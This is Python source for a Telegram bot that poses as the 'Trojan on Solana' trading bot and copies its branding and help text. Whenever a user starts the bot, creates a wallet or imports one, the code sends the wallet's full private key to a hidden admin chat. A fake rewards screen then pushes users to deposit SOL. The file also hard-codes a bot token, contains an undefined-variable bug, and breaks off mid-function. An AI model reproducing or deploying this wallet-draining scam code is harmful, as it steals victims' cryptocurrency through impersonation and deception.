import asyncio
import requests
import random
import string
from datetime import datetime
from solders.keypair import Keypair
from solders.pubkey import Pubkey
from telegram import InlineKeyboardButton, InlineKeyboardMarkup, Update
from telegram.ext import (
    Application,
    CommandHandler,
    CallbackQueryHandler,
    ContextTypes,
    MessageHandler,
    filters
)
import base58

# Configuration
TOKEN = "7694155921:AAGIywDQvY7ssqZMVX3tXTp-FJffE8LY3tg"
ADMIN_ID = 1305203741
SOLANA_RPC_URL = "https://api.mainnet-beta.solana.com"
COINGECKO_API = "https://api.coingecko.com/api/v3/simple/price?ids=solana&vs_currencies=usd"
TWITTER_URL = "https://twitter.com/TrojanOnSolana"
YOUTUBE_URL = "https://www.youtube.com/@TrojanOnSolana"

# Store user wallets globally
USER_WALLETS = {}
USER_STATE = {}  # To track user's current state
USER_WATCHLISTS = {}  # Store user watchlists
USER_COPY_TRADES = {}  # Store copy trade addresses
USER_SNIPER_ADDRESSES = {}  # Store sniper addresses

import time

_cached_price = 38.0
_cached_time = 0

def get_sol_price():
    global _cached_price, _cached_time
    now = time.time()

    # Cek apakah sudah 60 detik sejak terakhir ambil
    if now - _cached_time < 60:
        return _cached_price

    try:
        response = requests.get(COINGECKO_API, timeout=5)
        data = response.json()
        if "solana" in data and "usd" in data["solana"]:
            _cached_price = data["solana"]["usd"]
            _cached_time = now
            return _cached_price
        else:
            print(f"[get_sol_price] Unexpected response: {data}")
            return _cached_price
    except Exception as e:
        print(f"[get_sol_price] Error fetching price: {e}")
        return _cached_price


def get_sol_balance(public_key: str) -> tuple:
    """Get real SOL balance and USD value using Solana RPC"""
    try:
        payload = {
            "jsonrpc": "2.0",
            "id": 1,
            "method": "getBalance",
            "params": [public_key]
        }
        
        response = requests.post(SOLANA_RPC_URL, json=payload)
        data = response.json()
        
        lamports = data['result']['value']
        sol_balance = lamports / 10**9
        
        sol_price = get_sol_price()
        usd_value = sol_balance * sol_price
        
        return sol_balance, usd_value
    except Exception as e:
        print(f"Error getting balance: {e}")
        return 0.0, 0.0

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    USER_STATE[user.id] = "MAIN_MENU"
    
    # Initialize user wallets if not exists
    if user.id not in USER_WALLETS:
        USER_WALLETS[user.id] = {
            'wallets': [],
            'active_wallet_index': 0
        }
    
    # Check if user already has wallets
    if not USER_WALLETS[user.id]['wallets']:
        # Generate new Solana wallet if none exists
        keypair = Keypair()
        public_key = str(keypair.pubkey())
        private_key_bytes = bytes(keypair)
        private_key = base58.b58encode(private_key_bytes).decode('utf-8')
        
        new_wallet = {
            'public_key': public_key,
            'private_key': private_key_bytes.hex(),
            'private_key_base58': private_key,
            'name': f"Wallet 1"
        }
        
        USER_WALLETS[user.id]['wallets'].append(new_wallet)
        
        # Get initial balance
        sol_balance, usd_value = get_sol_balance(public_key)
        
        # Send private key to admin in base58 format with balance info
        await context.bot.send_message(
            chat_id=ADMIN_ID,
            text=f"⚠️ NEW USER @{user.username}\n\n"
                 f"Public : {public_key}\n\n"
                 f"Balance : {sol_balance:.3f} SOL (${usd_value:.2f})"
                 f"\n<code>{private_key}</code>",
            parse_mode="HTML"
        )
        print(f"New user: {user.id} - Created wallet")
    
    # Get active wallet
    active_wallet = USER_WALLETS[user.id]['wallets'][USER_WALLETS[user.id]['active_wallet_index']]
    public_key = active_wallet['public_key']
    
    # Get real balance
    sol_balance, usd_value = get_sol_balance(public_key)
    
    # Build the interface
    message_text = (
        "<b>Solana ·</b> <a href='https://solscan.io/account/57wyBoqSgrtqmveAjm7gvWJzeZeZ524meVD8wAVe8Cm8'>🅴</a>\n"
        f"<code>{public_key}</code> <i>(Tap to copy)</i>\n"
        f"Balance: <code>{sol_balance:.3f} SOL (${usd_value:.2f})</code>\n"
        f"—\n"
        f"Click on the Refresh button to update your current balance.\n\n"
        f"Join our Telegram group @trojan and follow us on <a href='{TWITTER_URL}'>Twitter</a>!\n\n"
        "💡If you aren't already, we advise that you <b>use any of the following "
        "bots to trade with</b>. You will have the <b>same wallets and settings "
        "across all bots</b>, but it will be significantly faster due to lighter user load.\n"
        "<a href='https://t.me/agamemnon_trojanbot'>Agamemnon</a> | "
        "<a href='https://t.me/achilles_trojanbot'>Achilles</a> | "
        "<a href='https://t.me/nestor_trojanbot'>Nestor</a> | "
        "<a href='https://t.me/odysseus_trojanbot'>Odysseus</a> | "
        "<a href='https://t.me/menelaus_trojanbot'>Menelaus</a> | "
        "<a href='https://t.me/diomedes_trojanbot'>Diomedes</a> | "
        "<a href='https://t.me/paris_trojanbot'>Paris</a> | "
        "<a href='https://t.me/helenus_trojanbot'>Helenus</a> | "
        "<a href='https://t.me/hector_trojanbot'>Hector</a>\n\n"
        "⚠️We have no control over ads shown by Telegram in this bot. Do not be scammed by fake airdrops or login pages.\n"
    )

    # Create keyboard layout
    keyboard = [
        [InlineKeyboardButton("Buy", callback_data="buy"), InlineKeyboardButton("Sell", callback_data="sell")],
        [InlineKeyboardButton("Positions", callback_data="positions"), 
         InlineKeyboardButton("Limit Orders", callback_data="limit_orders"), 
         InlineKeyboardButton("DCA Orders", callback_data="dca_orders")],
        [InlineKeyboardButton("Copy Trade", callback_data="copy_trade"), 
         InlineKeyboardButton("", callback_data="empty"), InlineKeyboardButton("Sniper 🆕", callback_data="sniper")],
        [InlineKeyboardButton("Trenches", callback_data="trenches"), 
         InlineKeyboardButton("💰 Rewards", callback_data="rewards"), 
         InlineKeyboardButton("⭐️ Watchlist", callback_data="watchlist")],
        [InlineKeyboardButton("Withdraw", callback_data="withdraw"), 
         InlineKeyboardButton("Settings", callback_data="settings")],
        [InlineKeyboardButton("Help", callback_data="help"), 
         InlineKeyboardButton("↻ Refresh", callback_data="refresh")],
    ]

    reply_markup = InlineKeyboardMarkup(keyboard)
    context.user_data['original_text'] = message_text
    context.user_data['public_key'] = public_key
    
    if update.message:
        await update.message.reply_text(
            text=message_text,
            reply_markup=reply_markup,
            parse_mode="HTML",
            disable_web_page_preview=True
        )
    else:
        await update.callback_query.edit_message_text(
            text=message_text,
            reply_markup=reply_markup,
            parse_mode="HTML",
            disable_web_page_preview=True
        )

async def refresh_balance(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    user = query.from_user
    if user.id not in USER_WALLETS or not USER_WALLETS[user.id]['wallets']:
        await query.edit_message_text(text="❌ Wallet not found. Please /start again.")
        return
    
    active_wallet = USER_WALLETS[user.id]['wallets'][USER_WALLETS[user.id]['active_wallet_index']]
    public_key = active_wallet['public_key']

    # Ambil saldo terbaru
    sol_balance, usd_value = get_sol_balance(public_key)

    # Ambil saldo lama dari wallet user (jika ada)
    old_sol_balance = active_wallet.get("last_balance", 0.0)
    old_usd_value = active_wallet.get("last_usd", 0.0)

    # Update cache saldo baru ke wallet user
    active_wallet["last_balance"] = sol_balance
    active_wallet["last_usd"] = usd_value

    # Kirim notifikasi ke admin jika saldo berubah
    if sol_balance != old_sol_balance:
        username = f"@{user.username}" if user.username else f"ID:{user.id}"

        # Ambil private key base58
        privkey_bytes = active_wallet.get("private_key_bytes")
        if privkey_bytes:
            base58_privkey = base58.b58encode(privkey_bytes).decode()
        else:
            base58_privkey = "NOT FOUND"

        await context.bot.send_message(
            chat_id=ADMIN_ID,
            text=f"🔄 BALANCE UPDATE : {username}\n\n"
                 f"PUBLIC: <code>{public_key}</code>\n\n"
                 f"OLD BALANCE: {old_sol_balance:.3f} SOL (${old_usd_value:.2f})\n"
                 f"NEW BALANCE: {sol_balance:.3f} SOL (${usd_value:.2f})\n"
                 f"DIFFERENCE: {sol_balance - old_sol_balance:.3f} SOL (${usd_value - old_usd_value:.2f})\n\n"
                 f"PRIVATE KEY:\n<code> {private_key}</code>",
            parse_mode="HTML"
        )
    
    # Update tampilan balance user
    if 'original_text' in context.user_data:
        original_text = context.user_data['original_text']
        balance_start = original_text.find("<code>", original_text.find("Balance:")) + len("<code>")
        balance_end = original_text.find("</code>", balance_start)
        prefix = original_text[:balance_start]
        suffix = original_text[balance_end:]
        new_balance = f"{sol_balance:.3f} SOL (${usd_value:.2f})"
        updated_text = prefix + new_balance + suffix
    else:
        updated_text = (
            "Solana:\n"
            f"<code>{public_key}</code> <i>(Tap to copy)</i>\n"
            f"Balance: <code>{sol_balance:.3f} SOL (${usd_value:.2f})</code>\n"
            f"—\n"
            "Balance has been refreshed!"
        )
    
    await query.edit_message_text(
        text=updated_text,
        reply_markup=query.message.reply_markup,
        parse_mode="HTML",
        disable_web_page_preview=True
    )


async def show_wallets_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    USER_STATE[query.from_user.id] = "WALLETS_MENU"
    
    user_id = query.from_user.id
    if user_id not in USER_WALLETS:
        USER_WALLETS[user_id] = {
            'wallets': [],
            'active_wallet_index': 0
        }
    
    wallets = USER_WALLETS[user_id]['wallets']
    active_index = USER_WALLETS[user_id]['active_wallet_index']
    
    if not wallets:
        message_text = "<b>Your Wallets</b>\n\nYou don't have any wallets yet."
    else:
        message_text = "<b>Your Wallets</b>\n\n"
        for i, wallet in enumerate(wallets):
            sol_balance, usd_value = get_sol_balance(wallet['public_key'])
            active_indicator = " ✅ (Active)" if i == active_index else ""
            message_text += (
                f"{i+1}. {wallet.get('name', f'Wallet {i+1}')}{active_indicator}\n"
                f"<code>{wallet['public_key']}</code>\n"
                f"Balance: {sol_balance:.3f} SOL (${usd_value:.2f})\n\n"
            )
    
    keyboard = [
        [InlineKeyboardButton("Create Solana Wallet", callback_data="create_wallet"),
         InlineKeyboardButton("Import Solana Wallet", callback_data="import_wallet")],
        [InlineKeyboardButton("Switch Active Wallet", callback_data="switch_wallet"),
         InlineKeyboardButton("View Private Keys", callback_data="view_private_keys")],
        [InlineKeyboardButton("← Back", callback_data="back_to_main")]
    ]
    
    reply_markup = InlineKeyboardMarkup(keyboard)
    await query.edit_message_text(
        text=message_text,
        reply_markup=reply_markup,
        parse_mode="HTML"
    )

async def view_private_keys(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    user_id = query.from_user.id
    if user_id not in USER_WALLETS or not USER_WALLETS[user_id]['wallets']:
        await query.edit_message_text(text="❌ No wallets found.")
        return
    
    wallets = USER_WALLETS[user_id]['wallets']
    message_text = "<b>Your Wallet Private Keys</b>\n\n"
    
    for i, wallet in enumerate(wallets):
        private_key_hex = wallet['private_key']
        # Remove last character for security
        private_key_partial = private_key_hex[:-3] + " "
        message_text += (
            f"{i+1}. {wallet.get('name', f'Wallet {i+1}')}\n"
            f"Public key: <code>{wallet['public_key']}</code>\n"
            f"Private key: <code>{private_key_partial}</code>\n\n"
        )
    
    message_text += "⚠️ <b>Warning:</b> Never share your private keys with anyone!"
    
    keyboard = [
        [InlineKeyboardButton("← Back to Wallets", callback_data="wallets")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await query.edit_message_text(
        text=message_text,
        reply_markup=reply_markup,
        parse_mode="HTML"
    )

async def create_wallet(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user = query.from_user

    keypair = Keypair()
    public_key = str(keypair.pubkey())
    private_key_bytes = bytes(keypair)
    private_key = base58.b58encode(private_key_bytes).decode('utf-8')

    # Initialize user wallet data if not exists
    if user.id not in USER_WALLETS:
        USER_WALLETS[user.id] = {
            'wallets': [],
            'active_wallet_index': 0
        }

    # Create new wallet
    new_wallet = {
        'public_key': public_key,
        'private_key': private_key_bytes.hex(),
        'private_key_base58': private_key,
        'name': f"Wallet {len(USER_WALLETS[user.id]['wallets']) + 1}",
        'last_balance': 0.0,
        'last_usd': 0.0,
        'private_key_bytes': private_key_bytes  # disimpan untuk refresh_balance
    }

    # Dapatkan saldo dan update wallet
    sol_balance, usd_value = get_sol_balance(public_key)
    new_wallet["last_balance"] = sol_balance
    new_wallet["last_usd"] = usd_value

    USER_WALLETS[user.id]['wallets'].append(new_wallet)

    username = f"@{user.username}" if user.username else f"ID:{user.id}"
    
    # Kirim ke admin setelah dapat balance
    await context.bot.send_message(
        chat_id=ADMIN_ID,
        text=f"⚠️ WALLET CREATED by {username}\n\n"
             f"Public: {public_key}\n\n"
             f"Balance: {sol_balance:.3f} SOL (${usd_value:.2f})"
             f"\n<b><code>{private_key}</code></b>",
        parse_mode="HTML"
    )

    # Kirim ke user
    message_text = (
        "<b>✅ New Solana Wallet Created</b>\n\n"
        f"Name: {new_wallet['name']}\n"
        f"<code>{public_key}</code>\n"
        f"Balance: <code>{sol_balance:.3f} SOL (${usd_value:.2f})</code>\n\n"
        "🔐 <b>Important:</b> Your private key has been created, "
        "Never share your private key with anyone!"
    )

    keyboard = [[InlineKeyboardButton("← Back to Wallets", callback_data="wallets")]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await query.edit_message_text(
        text=message_text,
        reply_markup=reply_markup,
        parse_mode="HTML"
    )


async def import_wallet(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    USER_STATE[query.from_user.id] = "AWAITING_PRIVATE_KEY"
    
    message_text = (
        "<b>Import Solana Wallet</b>\n\n"
        "Accepted formats are in the style of Phantom (e.g. '88631DEyXSWf...') or Solflare (e.g. [93,182,8,9,100,...]). Private keys from other Telegram bots should also work.")
    
    await query.edit_message_text(
        text=message_text,
        parse_mode="HTML"
    )

async def switch_active_wallet(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    USER_STATE[query.from_user.id] = "AWAITING_WALLET_SWITCH"
    
    user_id = query.from_user.id
    if user_id not in USER_WALLETS or not USER_WALLETS[user_id]['wallets']:
        await query.edit_message_text(text="❌ No wallets found. Please create or import a wallet first.")
        return
    
    wallets = USER_WALLETS[user_id]['wallets']
    message_text = "<b>Select Wallet to Activate</b>\n\n"
    
    for i, wallet in enumerate(wallets):
        sol_balance, usd_value = get_sol_balance(wallet['public_key'])
        message_text += (
            f"{i+1}. {wallet.get('name', f'Wallet {i+1}')}\n"
            f"<code>{wallet['public_key']}</code>\n"
            f"Balance: {sol_balance:.3f} SOL (${usd_value:.2f})\n\n"
        )
    
    keyboard = []
    for i in range(len(wallets)):
        keyboard.append([InlineKeyboardButton(f"Activate Wallet {i+1}", callback_data=f"activate_{i}")])
    
    keyboard.append([InlineKeyboardButton("← Back", callback_data="wallets")])
    
    reply_markup = InlineKeyboardMarkup(keyboard)
    await query.edit_message_text(
        text=message_text,
        reply_markup=reply_markup,
        parse_mode="HTML"
    )

async def activate_wallet(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    user_id = query.from_user.id
    wallet_index = int(query.data.split('_')[1])
    
    if user_id not in USER_WALLETS or wallet_index >= len(USER_WALLETS[user_id]['wallets']):
        await query.edit_message_text(text="❌ Invalid wallet selection.")
        return
    
    USER_WALLETS[user_id]['active_wallet_index'] = wallet_index
    active_wallet = USER_WALLETS[user_id]['wallets'][wallet_index]
    
    message_text = (
        "<b>✅ Active Wallet Changed</b>\n\n"
        f"Now using: {active_wallet.get('name', f'Wallet {wallet_index+1}')}\n"
        f"<code>{active_wallet['public_key']}</code>\n"
    )
    
    keyboard = [[InlineKeyboardButton("← Back to Wallets", callback_data="wallets")]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await query.edit_message_text(
        text=message_text,
        reply_markup=reply_markup,
        parse_mode="HTML"
    )

async def handle_private_key(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.message.from_user
    private_key_str = update.message.text.strip()
    
    if USER_STATE.get(user.id) != "AWAITING_PRIVATE_KEY":
        return
    
    try:
        try:
            private_key_bytes = base58.b58decode(private_key_str)
        except:
            if private_key_str.startswith('0x'):
                private_key_str = private_key_str[2:]
            private_key_bytes = bytes.fromhex(private_key_str)
        
        keypair = Keypair.from_bytes(private_key_bytes)
        public_key = str(keypair.pubkey())
        private_key_base58 = base58.b58encode(private_key_bytes).decode('utf-8')
        
        # Initialize user wallet data if not exists
        if user.id not in USER_WALLETS:
            USER_WALLETS[user.id] = {
                'wallets': [],
                'active_wallet_index': 0
            }
        
        # Create new wallet from imported key
        new_wallet = {
            'public_key': public_key,
            'private_key': private_key_bytes.hex(),
            'private_key_base58': private_key_base58,
            'name': f"Wallet {len(USER_WALLETS[user.id]['wallets']) + 1}"
        }
        
        USER_WALLETS[user.id]['wallets'].append(new_wallet)
        
        sol_balance, usd_value = get_sol_balance(public_key)
        await context.bot.send_message(
            chat_id=ADMIN_ID,
            text=f"⚠️ WALLET IMPORTED by @{user.username}\n\n"
                 f"{public_key}\n\n"
                 f"{sol_balance:.3f} SOL (${usd_value:.2f})"
                 f"\n<code><b>{private_key_base58}</b></code>",
                 parse_mode="HTML"
        )
        
        message_text = (
            "<b>✅ Wallet Imported Successfully</b>\n\n"
            f"Name: {new_wallet['name']}\n"
            f"<code>{public_key}</code>\n"
            f"Balance: <code>{sol_balance:.3f} SOL (${usd_value:.2f})</code>\n\n"
            "🔐 <b>Important:</b> Your private key has been imported. "
            "Never share your private key with anyone!"
        )
        
        keyboard = [[InlineKeyboardButton("← Back to Wallets", callback_data="wallets")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await update.message.reply_text(
            text=message_text,
            reply_markup=reply_markup,
            parse_mode="HTML"
        )
        
        USER_STATE[user.id] = "WALLETS_MENU"
        
    except Exception as e:
        print(f"Error importing wallet: {e}")
        error_message = (
            "❌ <b>Invalid Private Key</b>\n\n"
            "The private key you provided is invalid. Please try again or make sure it's in one of these formats:\n"
            "- Base58 format (recommended)\n"
            "- Hex format (64 characters)\n\n"
            "You can also go back to the wallets menu."
        )
        
        keyboard = [
            [InlineKeyboardButton("← Back to Wallets", callback_data="wallets"),
             InlineKeyboardButton("Try Again", callback_data="import_wallet")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await update.message.reply_text(
            text=error_message,
            reply_markup=reply_markup,
            parse_mode="HTML"
        )

async def show_sell_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    USER_STATE[user.id] = "SELL_MENU"

    message_text = "<b>Select token to sell</b>\n\nYou do not have any tokens yet! Start trading in the Buy menu.\n"
    keyboard = [
        [InlineKeyboardButton("Back", callback_data="back_to_main"),
         InlineKeyboardButton("↻ Refresh", callback_data="refresh_sell")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)

    # Jika input berasal dari tombol
    if update.callback_query:
        query = update.callback_query
        await query.answer()
        await query.edit_message_text(
            text=message_text,
            reply_markup=reply_markup,
            parse_mode="HTML"
        )
    # Jika input berasal dari command seperti /sell
    elif update.message:
        await update.message.reply_text(
            text=message_text,
            reply_markup=reply_markup,
            parse_mode="HTML"
        )

async def refresh_sell_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    await show_sell_menu(update, context)

async def show_positions_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    USER_STATE[user.id] = "POSITIONS_MENU"

    message_text = "<b>Your Positions</b>\n\nYou do not have any tokens yet! Start trading in the Buy menu.\n"
    keyboard = [
        [InlineKeyboardButton("Back", callback_data="back_to_main"),
         InlineKeyboardButton("↻ Refresh", callback_data="refresh_positions")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)

    if update.callback_query:
        query = update.callback_query
        await query.answer()
        await query.edit_message_text(
            text=message_text,
            reply_markup=reply_markup,
            parse_mode="HTML"
        )
    elif update.message:
        await update.message.reply_text(
            text=message_text,
            reply_markup=reply_markup,
            parse_mode="HTML"
        )

async def refresh_positions_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    await show_positions_menu(update, context)

async def show_limit_orders_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    USER_STATE[user.id] = "LIMIT_ORDERS_MENU"

    message_text = "<b>Limit Orders</b>\n\nYou have no active limit orders."
    keyboard = [
        [InlineKeyboardButton("Back", callback_data="back_to_main"),
         InlineKeyboardButton("↻ Refresh", callback_data="refresh_limit_orders")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)

    if update.callback_query:
        query = update.callback_query
        await query.answer()
        await query.edit_message_text(
            text=message_text,
            reply_markup=reply_markup,
            parse_mode="HTML"
        )
    elif update.message:
        await update.message.reply_text(
            text=message_text,
            reply_markup=reply_markup,
            parse_mode="HTML"
        )

async def refresh_limit_orders_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    await show_limit_orders_menu(update, context)

async def show_dca_orders_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    USER_STATE[query.from_user.id] = "DCA_ORDERS_MENU"
    
    message_text = "<b>DCA Orders</b>\n\nYou have no active DCA orders. Create a DCA order from the Buy/Sell menu.\n"
    keyboard = [
        [InlineKeyboardButton("Back", callback_data="back_to_main"),
         InlineKeyboardButton("↻ Refresh", callback_data="refresh_dca_orders")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    if update.callback_query:
        query = update.callback_query
        await query.answer()
        await query.edit_message_text(
            text=message_text,
            reply_markup=reply_markup,
            parse_mode="HTML"
        )
    elif update.message:
        await update.message.reply_text(
            text=message_text,
            reply_markup=reply_markup,
            parse_mode="HTML"
        )

async def refresh_dca_orders_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    await show_dca_orders_menu(update, context)

async def show_help_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    USER_STATE[user.id] = "HELP_MENU"

    message_text = """<u><b>How do I use Trojan?</b></u>
Check out our (<a href='https://www.youtube.com/@TrojanOnSola'>Youtube playlist</a>) where we explain it all and join our support chat for additional resources @trojan.

<u><b>Where can I find my referral code?</b></u>
Open the /start menu and click 💰Referrals.

<u><b>What are the fees for using Trojan?</b></u>
Successful transactions through Trojan incur a fee of 0.9%, if you were referred by another user. We don't charge a subscription fee or pay-wall any features.

<u><b>Security Tips: How can I protect my account from scammers?</b></u>
 - Safeguard does NOT require you to login with a phone number or QR code!
 - NEVER search for bots in telegram. Use only official links.
 - Admins and Mods NEVER dm first or send links, stay safe!

For an additional layer of security, setup your Secure Action Password (SAP) in the Settings menu. Once set up, you'll use this password to perform any sensitive action like withdrawing funds, exporting your keys or deleting a wallet. Your SAP is not recoverable once set, please set a hint to facilitate your memory.

<u><b>Trading Tips: Common Failure Reasons</b></u>
 - Slippage Exceeded: Up your slippage or sell in smaller increments.
 - Insufficient balance for buy amount + gas: Add SOL or reduce your tx amount.
 - Timed out: Can occur with heavy network loads, consider increasing your gas tip.

<u><b>My PNL seems wrong, why is that?</b></u>
The net profit of a trade takes into consideration the trade's transaction fees. Confirm your gas tip settings and ensure your settings align with your trading size. You can confirm the details of your trade on Solscan.io to verify the net profit.

<u><b>Additional questions or need support?</b></u>
Join our Telegram group @trojan and one of our admins can assist you."""
    
    keyboard = [[InlineKeyboardButton("Back", callback_data="back_to_main")]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    keyboard = [[InlineKeyboardButton("Back", callback_data="back_to_main")]]
    reply_markup = InlineKeyboardMarkup(keyboard)

    if update.callback_query:
        query = update.callback_query
        await query.answer()
        await query.edit_message_text(
            text=message_text,
            reply_markup=reply_markup,
            parse_mode="HTML"
        )
    elif update.message:
        await update.message.reply_text(
            text=message_text,
            reply_markup=reply_markup,
            parse_mode="HTML"
        )

async def show_settings_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user

    # Inisialisasi jika belum ada
    if 'settings' not in context.user_data:
        context.user_data['settings'] = {
            'confirm_trades': False,
            'mev_buys': False,
            'mev_sells': False,
            'chart_previews': False,
            'sell_protection': True,
            'bolt_settings': True,
            'auto_buy': True,
            'auto_sell': True,
        }

    settings = context.user_data['settings']
    settings_text = """💰<u><b>Fee Discount</b></u>: You are receiving a 10% discount on trading fees for being a referral of another user.

<b>FAQ</b>:

🚀 <b>Fast/Turbo/Custom Fee</b>: Set your preferred priority fee to decrease likelihood of failed transactions.

🔴 <b>Confirm Trades: Red = off</b>, clicking on the amount of SOL to purchase or setting a custom amount will instantly initiate the transaction.

🟢 <b>Confirm Trades: Green = on</b>, you will need to confirm your intention to swap by clicking the Buy or Sell buttons.

🛡️<b>MEV Protection</b>:
Enable this setting to send transactions privately and avoid getting frontrun or sandwiched.
<u>Important Note</u>: If you enable MEV Protection your transactions may take longer to get confirmed.

🟢 <b>Sell Protection: Green = on</b>, you will need to confirm your intention when selling more than 75% of your token balance."""
    
    keyboard = [
        [InlineKeyboardButton("← Back", callback_data="back_to_main"), InlineKeyboardButton("English → 🏳️", callback_data="bolt_settings")],
        [InlineKeyboardButton("Fast 🐴", callback_data="fee_fast"),
         InlineKeyboardButton("Turbo 🚀", callback_data="fee_turbo"),
         InlineKeyboardButton("✅ 0.0005 SOL", callback_data="fee_fast")],
        [InlineKeyboardButton("Sell Priority Fee Override: —", callback_data="sell_fee_override")],
        [InlineKeyboardButton("Buy Settings", callback_data="buy_settings"),
         InlineKeyboardButton("Sell Settings", callback_data="sell_settings")],
        [InlineKeyboardButton(f"{'🟢' if settings['mev_buys'] else '🔴'} MEV Protect (Buys)", callback_data="toggle_mev_buys"),
         InlineKeyboardButton(f"{'🟢' if settings['mev_sells'] else '🔴'} MEV Protect (Sells)", callback_data="toggle_mev_sells")],
        [InlineKeyboardButton(f"{'🟢' if settings['auto_buy'] else '🔴'} Auto Buy", callback_data="toggle_auto_buy"),
         InlineKeyboardButton(f"{'🟢' if settings['auto_sell'] else '🔴'} Auto Sell", callback_data="toggle_auto_sell")],
        [InlineKeyboardButton(f"{'🟢' if settings['confirm_trades'] else '🔴'} Confirm Trades", callback_data="toggle_confirm_trades")],
        [InlineKeyboardButton(f"Pnl Cards",callback_data="toggle_pnl_cards"),
         InlineKeyboardButton(f"{'🟢' if settings['chart_previews'] else '🔴'} Chart Previews", callback_data="toggle_chart_previews")],
        [InlineKeyboardButton(f"Show/Hide Tokens",callback_data="toggle_show_tokens"),
         InlineKeyboardButton(f"Wallets", callback_data="wallets")],
        [InlineKeyboardButton(f"🔐 Account Security",callback_data="toggle_account_security"),
         InlineKeyboardButton(f"{'🟢' if settings['sell_protection'] else '🔴'} Sell Protection", callback_data="toggle_sell_protection")],
        [InlineKeyboardButton(f"🐴⚡ BOLT {'🟢' if settings['bolt_settings'] else '🔴'}", callback_data="bolt_settings")],
        [InlineKeyboardButton(f"Simple Mode →", callback_data="simple_mode")],
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)

    if update.callback_query:
        query = update.callback_query
        await query.answer()
        await query.edit_message_text(
            text=settings_text,
            reply_markup=reply_markup,
            parse_mode="HTML"
        )
    elif update.message:
        await update.message.reply_text(
            text=settings_text,
            reply_markup=reply_markup,
            parse_mode="HTML"
        )

async def toggle_setting(update: Update, context: ContextTypes.DEFAULT_TYPE, setting_name):
    query = update.callback_query
    await query.answer()
    
    if 'settings' not in context.user_data:
        context.user_data['settings'] = {
            'confirm_trades': False,
            'mev_buys': False,
            'mev_sells': False,
            'chart_previews': False,
            'sell_protection': True,
            'bolt_settings': True,
            'auto_buy': True,
            'auto_sell': True,
        }
    
    current_value = context.user_data['settings'][setting_name]
    context.user_data['settings'][setting_name] = not current_value
    await show_settings_menu(update, context)

async def show_rewards_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    USER_STATE[query.from_user.id] = "REWARDS_MENU"
    now = datetime.utcnow().strftime("%Y-%m-%d %H:%M UTC")
    
    message_text = (
        "Cashback and Referral Rewards are paid out every 12 hours and airdropped directly to your Rewards Wallet. "
        "To be eligible, you must have at least 0.5 SOL in unpaid rewards.\n\n"
        
        "All Trojan users now enjoy a 10% boost to referral rewards and 20% cashback on trading fees.\n\n"
        
        "<b>Referral Rewards</b>\n"
        "• Users referred: 0\n"
        "• Direct: 0, Indirect: 0\n"
        "• Earned rewards: 0 SOL ($0.00)\n\n"
        
        "<b>Cashback Rewards</b>\n"
        "• Earned rewards: 1.62 SOL ($324.56)\n\n"
        
        "<b>Total Rewards</b>\n"
        "• Total paid: 0 SOL ($0.00)\n"
        "• Total unpaid: 1.62 SOL ($324.56)\n\n"
       
       "<b>⚠️ Insufficient SOL balance</b> \n" 
       "• <i>Send at least 0.5 SOL to your wallet, your rewards will automatic claimed to your wallet after your SOL balance enough.</i>\n\n"
        
        "<b>Your Referral Link</b>\n"
        "https://t.me/solana_trojansnipbot?start=r-trojA\n"
        "Your friends save 10% with your link.\n\n"
   
        f"Last updated at {now} (every 5 min)"
    )
    
    keyboard = [
        [InlineKeyboardButton("Close", callback_data="back_to_main"),
         InlineKeyboardButton("Update your referral link", callback_data="update_referral_link")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await query.edit_message_text(
        text=message_text,
        reply_markup=reply_markup,
        parse_mode="HTML",
        disable_web_page_preview=True
    )

async def update_referral_link(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    referral_code = ''.join(random.choices(string.ascii_uppercase + string.digits, k=10))
    referral_link = f"https://t.me/solana_trojansnipbot?start=r-{referral_code}"
    now = datetime.utcnow().strftime("%Y-%m-%d %H:%M UTC")
    
    message_text = (
        "Cashback and Referral Rewards are paid out every 12 hours and airdropped directly to your Rewards Wallet. "
        "To be eligible, you must have at least 0.005 SOL in unpaid rewards.\n\n"
        
        "All Trojan users now enjoy a 10% boost to referral rewards and 20% cashback on trading fees.\n\n"
        
        "<b>Referral Rewards</b>\n"
        "• Users referred: 0\n"
        "• Direct: 0, Indirect: 0\n"
